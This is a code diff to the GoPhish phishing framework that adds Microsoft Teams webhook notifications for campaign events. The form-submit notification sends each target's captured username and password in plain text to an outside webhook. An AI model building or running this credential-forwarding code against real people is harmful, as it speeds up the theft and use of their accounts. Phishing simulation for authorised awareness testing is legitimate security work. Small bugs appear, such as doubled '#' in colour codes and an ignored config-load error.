@@ -14,6 +14,9 @@ import (
     log "github.com/gophish/gophish/logger"
     "github.com/jinzhu/gorm"
     "github.com/oschwald/maxminddb-golang"
+    "github.com/gophish/gophish/config"
+    goteamsnotify "github.com/atc0005/go-teams-notify/v2"
+    "github.com/atc0005/go-teams-notify/v2/messagecard"
 )
 
 type mmCity struct {
@@ -56,6 +59,56 @@ type Submitted struct {
     RId          string    `json:"RId"`
     BaseRecipient
     Details      EventDetails
+}
+
+func (r *Result) teamsNotifyEmailSent(webhook_url string) {
+    mstClient := goteamsnotify.NewTeamsClient()
+    msgCard := messagecard.NewMessageCard()
+    msgCard.Title = "Email Sent"
+    msgCard.Text = "Email has been sent to target: **" + r.Email + "**"
+    msgCard.ThemeColor = "#00FF00"
+
+    if err := mstClient.Send(webhook_url, msgCard); err != nil {
+        log.Error("failed to send teams message: %v", err)
+    }
+}
+
+func (r *Result) teamsNotifyEmailOpened(webhook_url string) {
+    mstClient := goteamsnotify.NewTeamsClient()
+    msgCard := messagecard.NewMessageCard()
+    msgCard.Title = "Email Opened"
+    msgCard.Text = "Email has been opened by target: **" + r.Email + "**"
+    msgCard.ThemeColor = "##FFFF00"
+
+    if err := mstClient.Send(webhook_url, msgCard); err != nil {
+        log.Error("failed to send teams message: %v", err)
+    }
+}
+
+func (r *Result) teamsNotifyClickedLink(webhook_url string) {
+    mstClient := goteamsnotify.NewTeamsClient()
+    msgCard := messagecard.NewMessageCard()
+    msgCard.Title = "Clicked Link"
+    msgCard.Text = "Link has been clicked by target: **" + r.Email + "**"
+    msgCard.ThemeColor = "##FF9900"
+
+    if err := mstClient.Send(webhook_url, msgCard); err != nil {
+        log.Error("failed to send teams message: %v", err)
+    }
+}
+
+func (r *Result) teamsNotifySubmittedData(webhook_url string, details EventDetails) {
+    mstClient := goteamsnotify.NewTeamsClient()
+    msgCard := messagecard.NewMessageCard()
+    msgCard.Title = "Submitted Data"
+    username := details.Payload.Get("Username")
+    password := details.Payload.Get("Password")
+    msgCard.Text = "Target has submitted data! Details:<br>**Username**: " + username + "<br>**Password**: " + password
+    msgCard.ThemeColor = "##FF0000"
+
+    if err := mstClient.Send(webhook_url, msgCard); err != nil {
+        log.Error("failed to send teams message: %v", err)
+    }
 }
 
 func (r *Result) createEvent(status string, details interface{}) (*Event, error) {
@@ -118,6 +171,16 @@ func (r *Result) HandleEmailSent() error {
     sentfile.Write(data)
     sentfile.Write([]byte("\n"))
 
+    conf, err := config.LoadConfig("config.json")
+    if err != nil {
+        fmt.Printf("[-] Failed to load config.json from default path!")
+    }
+
+    teams_webhook := conf.TeamsWebhookURL
+    if len(teams_webhook) != 0 {
+        r.teamsNotifyEmailSent(teams_webhook)
+    }
+
     return db.Save(r).Error
 }
 
@@ -160,6 +223,17 @@ func (r *Result) HandleEmailOpened(details EventDetails) error {
     }
     r.Status = EventOpened
     r.ModifiedDate = event.Time
+
+    conf, err := config.LoadConfig("config.json")
+    if err != nil {
+        fmt.Printf("[-] Failed to load config.json from default path!")
+    }
+
+    teams_webhook := conf.TeamsWebhookURL
+    if len(teams_webhook) != 0 {
+        r.teamsNotifyEmailOpened(teams_webhook)
+    }
+
     return db.Save(r).Error
 }
 
@@ -200,6 +274,16 @@ func (r *Result) HandleClickedLink(details EventDetails) error {
     clickfile.Write(data)
     clickfile.Write([]byte("\n"))
 
+    conf, err := config.LoadConfig("config.json")
+    if err != nil {
+        fmt.Printf("[-] Failed to load config.json from default path!")
+    }
+
+    teams_webhook := conf.TeamsWebhookURL
+    if len(teams_webhook) != 0 {
+        r.teamsNotifyClickedLink(teams_webhook)
+    }
+
     return db.Save(r).Error
 }
 
@@ -235,6 +319,16 @@ func (r *Result) HandleFormSubmit(details EventDetails) error {
     }
     credfile.Write(data)
     credfile.Write([]byte("\n"))
+
+    conf, err := config.LoadConfig("config.json")
+    if err != nil {
+        fmt.Printf("[-] Failed to load config.json from default path!")
+    }
+
+    teams_webhook := conf.TeamsWebhookURL
+    if len(teams_webhook) != 0 {
+        r.teamsNotifySubmittedData(teams_webhook, details)
+    }
 
     return db.Save(r).Error
 }
